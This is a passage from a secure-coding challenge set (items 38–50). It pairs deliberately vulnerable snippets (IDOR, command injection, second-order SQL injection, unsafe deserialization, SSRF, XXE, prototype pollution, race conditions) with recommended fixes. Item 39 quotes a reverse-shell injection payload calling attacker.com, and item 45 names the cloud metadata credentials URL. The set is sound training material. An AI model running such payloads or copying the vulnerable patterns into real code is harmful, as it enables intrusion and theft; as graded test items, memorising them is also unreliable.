                    outputFile.getParentFile().mkdirs();
                    try (FileOutputStream fos = new FileOutputStream(outputFile)) {
                        byte[] buffer = new byte[4096];
                        int len;
                        while ((len = zis.read(buffer)) > 0) {
                            fos.write(buffer, 0, len);
                        }
                    }
                }
                zis.closeEntry();
            }
        }
    }
}
```

## Recommendation
After constructing `outputFile`, call `outputFile.getCanonicalPath()` to resolve all `../` sequences and symbolic links to an absolute path. Then verify the canonical path starts with `new File(destDir).getCanonicalPath() + File.separator`. If it does not, throw an exception and abort extraction — this is the "Zip Slip" defense. Apply this check for both directory and file entries. Additionally, enforce limits on the number of entries, total uncompressed size (to prevent "zip bombs"), and individual file sizes during extraction.

---

# 38. Broken Object Level Authorization in REST API

## Difficulty *
Medium

## Description *
A project management API allows team members to update task details via `PUT /api/tasks/{taskId}`. The API verifies the user is authenticated but does not verify whether the task belongs to a project the user is a member of. During a bug bounty audit, a researcher updated tasks belonging to organizations they had no relationship with by enumerating task IDs.

## Programming Language
C#

## Challenge Details
The task update controller retrieves the task by ID from the database and allows the update if the user is authenticated, without checking whether the task belongs to a project the requesting user is authorized to modify. This is a Broken Object Level Authorization (BOLA/IDOR) vulnerability at the API level. The authorization check must verify the relationship between the requesting user and the resource before allowing modification. Your task is to implement an authorization check that confirms the user has access to the project containing the specified task.

## Initial Code (Vulnerable snippet)

### vulnerable.code
```csharp
[HttpPut("api/tasks/{taskId}")]
[Authorize]
public async Task<IActionResult> UpdateTask(
    int taskId, 
    [FromBody] UpdateTaskRequest request)
{
    var task = await _taskRepository.GetByIdAsync(taskId);
    
    if (task == null)
        return NotFound();

    task.Title = request.Title;
    task.Description = request.Description;
    task.Status = request.Status;
    task.DueDate = request.DueDate;

    await _taskRepository.UpdateAsync(task);
    return Ok(task);
}
```

## Recommendation
Retrieve the current user's ID from the authentication token. Before applying updates, verify that the task's associated project has a membership record linking the current user — query the `project_members` table (or equivalent) for a record matching `(project_id = task.ProjectId, user_id = currentUserId)`. If no membership exists, return `403 Forbidden`. Encapsulate this authorization logic in a reusable service or policy rather than repeating it in every controller action. This pattern should be applied to all resource-accessing endpoints throughout the API.

---

# 39. Command Injection via PDF Generator

## Difficulty *
Medium

## Description *
A legal document platform generates PDF reports by invoking a command-line PDF rendering tool (`wkhtmltopdf`) with user-supplied parameters including a document title. An attacker injected shell metacharacters into the document title field, causing the server to execute arbitrary commands — eventually establishing a reverse shell.

## Programming Language
Python

## Challenge Details
The PDF generation service constructs a shell command that includes a user-supplied document title as a command-line argument, executed with `shell=True`. Shell metacharacters such as `; nc attacker.com 4444 -e /bin/bash` appended to the title are executed by the shell interpreter. Even arguments to external commands must be passed safely. Your task is to rewrite the command construction so the title is passed as a separate, uninterpreted argument to the subprocess, eliminating shell injection.

## Initial Code (Vulnerable snippet)

### vulnerable.code
```python
import subprocess
import tempfile
import os

def generate_pdf(document_html: str, title: str, output_path: str) -> bool:
    with tempfile.NamedTemporaryFile(suffix='.html', delete=False, mode='w') as f:
        f.write(document_html)
        html_path = f.name

    command = f'wkhtmltopdf --title "{title}" {html_path} {output_path}'

    result = subprocess.run(command, shell=True, capture_output=True)
    os.unlink(html_path)

    return result.returncode == 0
```

## Recommendation
Call `subprocess.run()` with `shell=False` and pass the command as a list: `['wkhtmltopdf', '--title', title, html_path, output_path]`. Without shell interpretation, the `title` value is passed as a literal string argument, making it impossible to inject shell commands regardless of its content. Additionally, validate `title` against an allowlist of safe characters (letters, numbers, spaces, common punctuation) and enforce a maximum length. Validate `output_path` to ensure it falls within an expected directory. Never pass user input into a `shell=True` command.

---

# 40. Insecure Direct Object Reference in File Sharing

## Difficulty *
Medium

## Description *
A cloud document sharing platform generates share links using sequential numeric share IDs (e.g., `/share/12345`). A researcher enumerated share IDs and accessed documents shared by other users, including confidential legal contracts and financial reports, without any authentication or authorization check.

## Programming Language
JavaScript (Node.js)

## Challenge Details
The share link handler retrieves documents by their sequential share ID from the database and serves them to any requesting client — authenticated or not — without verifying that the requester holds a valid share token or that the document is actually intended to be publicly accessible. Sequential numeric IDs make enumeration trivial. The sharing mechanism must ensure that only intended recipients can access shared documents. Your task is to replace the sequential ID-based access model with a token-based model that cannot be guessed or enumerated.

## Initial Code (Vulnerable snippet)

### vulnerable.code
```javascript
const express = require('express');
const router = express.Router();

// Public share link endpoint
router.get('/share/:shareId', async (req, res) => {
    const shareId = parseInt(req.params.shareId);

    const share = await db.query(
        'SELECT s.*, d.title, d.content, d.file_path FROM shares s JOIN documents d ON s.document_id = d.id WHERE s.id = $1',
        [shareId]
    );

    if (!share.rows[0]) {
        return res.status(404).json({ error: 'Share not found' });
    }

    const document = share.rows[0];
    res.json({ title: document.title, content: document.content });
});
```

## Recommendation
Generate share tokens as cryptographically random values using `crypto.randomBytes(32).toString('hex')` (or URL-safe Base64), and store the token in the `shares` table rather than relying on the sequential numeric ID. Expose the token in the share URL (e.g., `/share/a3f8bc...`). Query shares by token: `WHERE token = $1`. Also add an expiration timestamp to shares, and optionally a per-share access count limit. The token's unpredictability provides access control — but you should still validate expiry and optionally require the recipient to be authenticated for sensitive documents.

---

## Hard Challenges

---

# 41. Second-Order SQL Injection in Profile Update

## Difficulty *
Hard

## Description *
A multi-tenant CRM platform allows users to set their display name, which is later used in an internal reporting query that generates activity summaries. A security researcher found that by setting their display name to a SQL injection payload, the injected SQL executed when the reporting system later used the stored name in a query — even though the initial storage was safe.

## Programming Language
Java

## Challenge Details
The user profile update correctly uses parameterized queries to store the display name. However, a separate reporting module retrieves the stored display name and concatenates it directly into a new SQL query for generating audit reports. Because the data originated from the database (and therefore seems "trusted"), the developer did not parameterize it. An attacker stores a SQL payload as their display name during registration, then waits for the reporting query to execute it. Your task is to fix the reporting module so that all values, even those retrieved from the database, are treated as data and not SQL.

## Initial Code (Vulnerable snippet)

### vulnerable.code
```java
// Reporting service that retrieves user activity
public List<ActivityReport> generateUserActivityReport(int organizationId) {
    // This query retrieves user names from the database
    List<String> userNames = jdbcTemplate.queryForList(
        "SELECT display_name FROM users WHERE org_id = ?",
        String.class,
        organizationId
    );

    List<ActivityReport> reports = new ArrayList<>();
    for (String userName : userNames) {
        // Second-order injection: the stored name is concatenated into a new query
        String activityQuery = 
            "SELECT action, timestamp, resource FROM audit_log " +
            "WHERE actor_name = '" + userName + "' " +
            "ORDER BY timestamp DESC LIMIT 100";

        List<Map<String, Object>> activities = jdbcTemplate.queryForList(activityQuery);
        reports.add(new ActivityReport(userName, activities));
    }
    return reports;
}
```

## Recommendation
Parameterize the second query just as you would parameterize a query taking user input directly. Values retrieved from the database are not inherently safe — they may have been stored by an attacker and could contain SQL syntax. Use `jdbcTemplate.queryForList(sql, rowMapper, userName)` with a `?` placeholder for `actor_name`. The principle of parameterized queries applies regardless of whether the value came from the HTTP request, a file, or the database itself. Alternatively, redesign the schema so the audit log uses a foreign key to `users.id` rather than storing the display name as a string.

---

# 42. GraphQL Introspection and Authorization Bypass

## Difficulty *
Hard

## Description *
A fintech platform's GraphQL API has introspection enabled in production, allowing attackers to map the full schema including internal administrative mutations. A researcher used the schema to discover an undocumented `setUserRole` mutation and successfully called it with their own user ID to elevate their privileges to `SUPER_ADMIN`.

## Programming Language
JavaScript (Node.js)

## Challenge Details
The GraphQL server has introspection enabled and the `setUserRole` mutation lacks any authorization check in its resolver — it was intended only for internal use but is accessible from the public API. The challenge combines two issues: the introspection exposure that reveals the mutation's existence, and the missing resolver-level authorization. The mutation resolver must verify the caller holds the required administrative role before executing. Your task is to add resolver-level authorization to the administrative mutation and implement the recommended production introspection configuration.

## Initial Code (Vulnerable snippet)

### vulnerable.code
```javascript
const { ApolloServer, gql } = require('@apollo/server');

const typeDefs = gql`
    type Mutation {
        updateProfile(input: ProfileInput!): User
        setUserRole(userId: ID!, role: UserRole!): User    # Internal admin mutation
        deleteAccount(userId: ID!): Boolean
    }

    enum UserRole {
        USER
        MODERATOR
        ADMIN
        SUPER_ADMIN
    }
`;

const resolvers = {
    Mutation: {
        setUserRole: async (_, { userId, role }, context) => {
            const user = await userService.findById(userId);
            user.role = role;
            await userService.save(user);
            return user;
        }
    }
};

const server = new ApolloServer({
    typeDefs,
    resolvers
    // No introspection control
});
```

## Recommendation
In the `setUserRole` resolver, check `context.user?.role` against the required administrative role (e.g., `SUPER_ADMIN`) and throw a `GraphQLError` with a `FORBIDDEN` code if the check fails — this must be the first line of the resolver. Disable introspection in non-development environments: set `introspection: process.env.NODE_ENV === 'development'` in the Apollo Server options. Consider using a schema directive (like `@auth`) or a validation rule to enforce authorization at the schema level for all sensitive mutations, rather than relying on per-resolver manual checks alone.

---

# 43. Insecure Deserialization Leading to RCE

## Difficulty *
Hard

## Description *
A Java enterprise application uses Java serialization to persist task objects in a Redis cache, keyed by a session identifier. The cached data is read from Redis and deserialized on each request. During a red team engagement, the attackers modified the Redis cache entry for their session ID to a crafted serialized payload using a known Commons Collections gadget chain, achieving remote code execution on the application server.

## Programming Language
Java

## Challenge Details
The caching layer reads serialized data from Redis and deserializes it using Java's native `ObjectInputStream`. If an attacker can write to Redis (through a separate Redis exposure or SSRF), they can inject a malicious serialized payload. Even without direct Redis access, any data path leading to `ObjectInputStream.readObject()` is dangerous. The application must never deserialize untrusted data using native Java serialization. Your task is to replace Java serialization with a safe, non-executable serialization format and implement integrity verification on cached data.

## Initial Code (Vulnerable snippet)

### vulnerable.code
```java
import java.io.*;
import redis.clients.jedis.Jedis;

public class TaskCacheService {

    private final Jedis jedis;

    public TaskContext loadTaskContext(String sessionId) throws Exception {
        byte[] cached = jedis.get(("task:" + sessionId).getBytes());
        if (cached == null) return null;

        try (ObjectInputStream ois = new ObjectInputStream(
                new ByteArrayInputStream(cached))) {
            return (TaskContext) ois.readObject();
        }
    }

    public void saveTaskContext(String sessionId, TaskContext context) throws Exception {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        try (ObjectOutputStream oos = new ObjectOutputStream(baos)) {
            oos.writeObject(context);
        }
        jedis.setex(("task:" + sessionId).getBytes(), 3600, baos.toByteArray());
    }
}
```

## Recommendation
Replace `ObjectInputStream` with JSON serialization using Jackson or Gson — serialize `TaskContext` to a JSON string and store it in Redis as a string, then deserialize by reading specific fields into a new `TaskContext` instance. If you must use binary serialization, use a safe alternative like Kryo with a class allowlist configured. Additionally, compute an HMAC of the serialized data using a server-side secret key and store it alongside the cached value; verify the HMAC before deserializing to detect tampering. Never call `readObject()` on data from any external store without integrity verification and format-level safety.

---

# 44. Business Logic Flaw in Fund Transfer

## Difficulty *
Hard

## Description *
A digital wallet platform allows users to transfer funds to other users. The transfer validation checks that the sender has a sufficient balance. A researcher discovered that by submitting a negative transfer amount, the system debited the recipient's account and credited the sender's account — effectively stealing funds while passing all validation checks.

## Programming Language
Python

## Challenge Details
The fund transfer service validates that the sender's balance is greater than or equal to the requested amount, then performs the debit and credit operations. Because no check is performed on whether the amount is positive, a negative transfer amount passes the balance check (the sender's balance is always ≥ a negative number) and results in the sender receiving funds from the recipient. This is a business logic vulnerability — the vulnerability is in the application's rules, not in a technical weakness like injection. Your task is to implement comprehensive amount validation that enforces all business rules for a valid transfer.

## Initial Code (Vulnerable snippet)

### vulnerable.code
```python
from decimal import Decimal
from flask import Flask, request, jsonify, g

app = Flask(__name__)

@app.route('/api/wallet/transfer', methods=['POST'])
def transfer_funds():
    data = request.get_json()
    recipient_id = data['recipient_id']
    amount = Decimal(str(data['amount']))

    sender = wallet_service.get_wallet(g.current_user.id)

    if sender.balance < amount:
        return jsonify({'error': 'Insufficient balance'}), 400

    with db.transaction():
        wallet_service.debit(g.current_user.id, amount)
        wallet_service.credit(recipient_id, amount)

    return jsonify({'success': True, 'new_balance': str(sender.balance - amount)})
```

## Recommendation
Validate that `amount` is a positive number greater than zero as the very first check: `if amount <= 0: return error`. Also enforce a maximum transfer limit per transaction and per day. Validate that `recipient_id` is a real, active account that is not the sender's own account. After all validation, re-fetch the sender's balance inside the database transaction and perform the balance check atomically (using `SELECT FOR UPDATE` or an equivalent locking mechanism) to prevent race conditions. Log all transfer attempts — including failed ones — with the amount and parties involved for fraud detection.

---

# 45. SSRF via Cloud Metadata Service

## Difficulty *
Hard

## Description *
A cloud-native SaaS application deployed on AWS EC2 features a URL preview service for its messaging platform. Users paste a URL and receive a link preview with title and description. Red teamers discovered that a request to `http://169.254.169.254/latest/meta-data/iam/security-credentials/` returned the EC2 instance's IAM role credentials, which they used to access S3 buckets and RDS instances belonging to the company.

## Programming Language
Go

## Challenge Details
The link preview service fetches the target URL from the application server without any filtering of private or cloud-metadata IP ranges. The EC2 Instance Metadata Service (IMDS) is accessible from all code running on the instance. This challenge requires not only blocking the well-known `169.254.169.254` address but also handling DNS rebinding (where a hostname resolves to a private IP after passing an initial check) and IMDSv1's lack of authentication. Your task is to implement multi-layered SSRF protection including DNS-resolved IP validation and redirect chain checking.

## Initial Code (Vulnerable snippet)

### vulnerable.code
```go
package main

import (
    "io"
    "net/http"
    "golang.org/x/net/html"
)

func fetchLinkPreview(targetURL string) (*LinkPreview, error) {
    client := &http.Client{Timeout: 10 * time.Second}

    resp, err := client.Get(targetURL)
    if err != nil {
        return nil, err
    }
    defer resp.Body.Close()

    body, _ := io.ReadAll(io.LimitReader(resp.Body, 1*1024*1024))
    preview := extractMetaTags(body)
    return preview, nil
}
```

## Recommendation
Create a custom `http.Transport` where `DialContext` resolves the hostname and validates the resulting IP against all blocked ranges: `127.0.0.0/8` (loopback), `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16` (RFC1918), `169.254.0.0/16` (link-local/IMDS), `::1/128`, and `fc00::/7`. Set `CheckRedirect` on the `http.Client` to apply the same validation to every redirect URL before following it, blocking redirect-based bypass attempts. Require the scheme to be `https` only for production. Also configure your EC2 instance to use IMDSv2 (requiring a session token) as a defense-in-depth measure at the infrastructure level.

---

# 46. Timing Attack on API Key Verification

## Difficulty *
Hard

## Description *
A payment processing API verifies client API keys using a string equality comparison. A security researcher demonstrated a statistical timing attack: by measuring response times across thousands of requests with varying API key prefixes, they could progressively determine the correct key character-by-character, as the comparison terminates early on the first non-matching character.

## Programming Language
Go

## Challenge Details
The API key verification function compares the submitted key against the stored key using Go's `==` operator, which performs a byte-by-byte comparison and short-circuits on the first mismatch. An attacker can measure the time differences (typically nanoseconds, but statistically measurable over many requests) to determine how many leading characters of their guess are correct. This enables an offline enumeration attack that can recover the full key. The comparison must take constant time regardless of where the keys first differ. Your task is to replace the vulnerable comparison with a timing-safe alternative.

## Initial Code (Vulnerable snippet)

### vulnerable.code
```go
package main

import (
    "net/http"
    "strings"
)

var validAPIKey = "pay_live_sk_a3f8bc9d21e4f5607890abcdef123456"

func verifyAPIKey(r *http.Request) bool {
    authHeader := r.Header.Get("Authorization")
    
    if !strings.HasPrefix(authHeader, "Bearer ") {
        return false
    }
    
    submittedKey := strings.TrimPrefix(authHeader, "Bearer ")
    
    // Vulnerable: == performs early-exit comparison
    return submittedKey == validAPIKey
}
```

## Recommendation
Use `subtle.ConstantTimeCompare()` from Go's `crypto/subtle` package to compare the API key. This function always examines all bytes of both slices before returning, taking the same amount of time regardless of where they differ. It returns 1 if equal and 0 if not: `subtle.ConstantTimeCompare([]byte(submittedKey), []byte(validAPIKey)) == 1`. Also ensure both values are compared after length normalization — `ConstantTimeCompare` still returns 0 immediately if lengths differ, so consider comparing length separately before the content comparison to ensure timing consistency. Store API keys as HMAC-SHA256 hashes server-side for additional protection.

---

# 47. XXE with SSRF in SAML Authentication

## Difficulty *
Hard

## Description *
An enterprise SSO system accepts SAML assertions from identity providers. A red team engaged by the company submitted a crafted SAML response containing an XML external entity declaration referencing the internal AWS metadata service. The SAML parser resolved the entity, causing the SSO service to make an outbound HTTP request to the metadata endpoint and embed the response in an error message — leaking IAM credentials.

## Programming Language
Java

## Challenge Details
The SAML response parser processes XML input from the identity provider (which may be attacker-controlled in a SAML replay or relay attack) without disabling DTD and external entity processing. This combines XXE with SSRF: the external entity points to an internal URL, and the parser makes the HTTP request to fetch it. The XML parser must be hardened against all external entity and DTD processing. Your task is to configure both the SAML XML parser and any underlying XML processing components to fully disable external entity resolution.

## Initial Code (Vulnerable snippet)

### vulnerable.code
```java
import org.opensaml.core.xml.io.Unmarshaller;
import org.opensaml.core.xml.io.UnmarshallerFactory;
import org.w3c.dom.Document;
import javax.xml.parsers.*;

public class SamlResponseParser {

    public SAMLResponse parseSamlResponse(String samlResponseB64) throws Exception {
        byte[] decoded = Base64.getDecoder().decode(samlResponseB64);
        
        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
        factory.setNamespaceAware(true);
        // Missing: XXE hardening
        
        DocumentBuilder builder = factory.newDocumentBuilder();
        Document doc = builder.parse(new ByteArrayInputStream(decoded));
        
        UnmarshallerFactory unmarshallerFactory = 
            XMLObjectProviderRegistrySupport.getUnmarshallerFactory();
        Unmarshaller unmarshaller = unmarshallerFactory.getUnmarshaller(doc.getDocumentElement());
        
        return (SAMLResponse) unmarshaller.unmarshall(doc.getDocumentElement());
    }
}
```

## Recommendation
Apply the full set of XXE mitigations to the `DocumentBuilderFactory` before any parsing: disable `DOCTYPE` declarations (`http://apache.org/xml/features/disallow-doctype-decl` → `true`), disable external general entities, disable external parameter entities, and set `FEATURE_SECURE_PROCESSING` to `true`. Apply these settings to any XML factory used throughout the SAML processing pipeline, including schema validation steps. Use OpenSAML's built-in security configuration where available, as it may provide hardened defaults. Additionally, validate the SAML issuer and signature before processing the content, limiting exposure to assertions from known, trusted identity providers only.

---

# 48. Prototype Pollution to RCE via Template Engine

## Difficulty *
Hard

## Description *
A Node.js CMS platform processes user-submitted JSON to configure page layouts. The configuration parser uses a vulnerable deep merge that allows prototype pollution. A researcher polluted `Object.prototype.sourceURL` with a JavaScript payload, which was subsequently picked up by the Pug template engine's internal rendering path — achieving server-side template injection and remote code execution.

## Programming Language
JavaScript (Node.js)

## Challenge Details
The CMS accepts a user-supplied JSON configuration for page layouts and merges it into the page context using a recursive merge function. Because the merge does not filter prototype-poisoning keys, an attacker can inject properties into `Object.prototype`. The template engine (Pug in this case) internally accesses certain properties on plain objects during rendering; if these properties are present on the prototype and contain executable expressions, they are evaluated. This is a chained vulnerability: prototype pollution → template engine gadget → RCE. Your task is to fix the merge function and also sanitize the template rendering context.

## Initial Code (Vulnerable snippet)

### vulnerable.code
```javascript
const pug = require('pug');
const express = require('express');
const app = express();

function mergeConfig(base, override) {
    for (const key in override) {
        if (typeof override[key] === 'object' && override[key] !== null) {
            if (!base[key]) base[key] = {};
            mergeConfig(base[key], override[key]);
        } else {
            base[key] = override[key];
        }
    }
    return base;
}

app.post('/api/render-page', (req, res) => {
    const userConfig = req.body.config;
    const pageContext = mergeConfig({ title: 'My Page', layout: 'default' }, userConfig);

    const html = pug.render(pageContext.template || defaultTemplate, pageContext);
    res.send(html);
});
```

## Recommendation
Fix the merge function to explicitly block keys named `__proto__`, `constructor`, and `prototype`. Use `Object.hasOwnProperty.call(override, key)` to iterate only own properties. Create the base object with `Object.create(null)` to eliminate its prototype chain, then convert to a regular object only after merging. For the template rendering context, freeze or seal the context object using `Object.freeze()` before passing it to Pug. Audit all template engine features that access global or prototype properties and disable dangerous features like `self` access or `globals` in the Pug options. Consider using `vm.runInNewContext()` with a stripped-down sandbox for template execution.

---

# 49. Race Condition in Concurrent Withdrawal System

## Difficulty *
Hard

## Description *
A cryptocurrency exchange processes withdrawal requests asynchronously. The withdrawal service checks the user's available balance before processing. A user scripted 50 concurrent withdrawal requests for their entire balance simultaneously; all 50 passed the balance check before any updated the balance, resulting in 50x their actual balance being withdrawn — depleting exchange funds.

## Programming Language
Go

## Challenge Details
The withdrawal handler reads the user's balance, confirms it covers the requested amount, then decrements the balance and initiates the payout — all as separate operations without database-level locking. When 50 concurrent goroutines execute this sequence simultaneously, all read the same initial balance (say, $1000) before any have written an updated balance, and all believe the withdrawal is valid. This is a critical financial race condition. Your task is to implement database-level atomic operations or pessimistic locking to ensure concurrent withdrawals serialize correctly.

## Initial Code (Vulnerable snippet)

### vulnerable.code
```go
func (s *WithdrawalService) ProcessWithdrawal(userID int64, amount decimal.Decimal) error {
    user, err := s.db.GetUser(userID)
    if err != nil {
        return err
    }

    if user.Balance.LessThan(amount) {
        return ErrInsufficientFunds
    }

    // Simulate network delay for payout initiation
    payoutID, err := s.payoutProvider.Initiate(userID, amount)
    if err != nil {
        return err
    }

    newBalance := user.Balance.Sub(amount)
    return s.db.UpdateUserBalance(userID, newBalance)
}
```

## Recommendation
Use a database-level `UPDATE ... WHERE balance >= amount` atomic operation that performs the check and decrement in a single SQL statement: `UPDATE wallets SET balance = balance - $1 WHERE user_id = $2 AND balance >= $1`. Check the number of affected rows — if zero, the balance was insufficient (or another concurrent request already decremented it). This approach is inherently race-safe without requiring application-level locks. Alternatively, use `SELECT FOR UPDATE` within a serializable transaction to pessimistically lock the user's wallet row for the duration of the operation. Wrap the payout initiation and balance update in a saga pattern to handle partial failures and rollback scenarios.

---

# 50. Subdomain Takeover via Dangling CNAME

## Difficulty *
Hard

## Description *
A software company's domain management system allows customers to configure custom subdomains pointing to their service instances. When a customer cancels their subscription, the application deletes their service instance but leaves the DNS CNAME record intact, pointing to a now-deprovisioned external service endpoint. An attacker claimed the deprovisioned endpoint on the external platform and began serving phishing content under the company's trusted subdomain.

## Programming Language
Go

## Challenge Details
The subscription cancellation workflow removes the customer's application instance and database records but does not clean up the DNS CNAME record that was created for their custom subdomain. The dangling CNAME points to an external service (e.g., a CDN, PaaS platform, or cloud storage bucket) whose name is now unregistered and claimable by anyone. The complete deprovisioning flow must include DNS record cleanup. Your task is to audit the cancellation workflow and implement atomic cleanup that ensures DNS records are removed when the associated service instance is deleted — and add a monitoring mechanism for detecting existing dangling records.

## Initial Code (Vulnerable snippet)

### vulnerable.code
```go
package main

import (
    "database/sql"
    "log"
)

type SubscriptionService struct {
    db        *sql.DB
    dnsClient DNSProviderClient
    appHost   AppHostingClient
}

func (s *SubscriptionService) CancelSubscription(subscriptionID string) error {
    sub, err := s.getSubscription(subscriptionID)
    if err != nil {
        return err
    }

    // Deprovision the application instance
    if err := s.appHost.DeleteInstance(sub.InstanceID); err != nil {
        log.Printf("Failed to delete instance %s: %v", sub.InstanceID, err)
    }

    // Mark subscription as cancelled in DB
    _, err = s.db.Exec(
        "UPDATE subscriptions SET status='cancelled', cancelled_at=NOW() WHERE id=$1",
        subscriptionID,
    )
    return err

    // DNS CNAME record is never removed
}
```

## Recommendation
Add DNS record deletion as a mandatory step in the cancellation workflow: call `s.dnsClient.DeleteCNAME(sub.CustomSubdomain)` before or alongside the instance deletion, and handle failures explicitly (retry with exponential backoff, alert on persistent failure). Implement the cancellation as a transactional saga with compensating actions — if DNS deletion fails, consider blocking the cancellation or flagging the subdomain for manual review rather than leaving it dangling. Additionally, build a periodic scanner that queries all `cancelled` subscription records with associated subdomains, performs a DNS lookup, and alerts if the CNAME still resolves to an external target — enabling detection of missed cleanups. Document subdomain decommissioning as a required checklist step in your runbooks.

---

*End of 50 Secure Coding Challenges*

---

> **Platform Note:** Submit your corrected version of each vulnerable code snippet. The AI evaluator will verify that (1) the primary vulnerability has been eliminated, (2) the intended functionality is preserved, and (3) no new significant vulnerabilities have been introduced. Focus on understanding the underlying security principle each challenge teaches — the skills transfer directly to production codebases.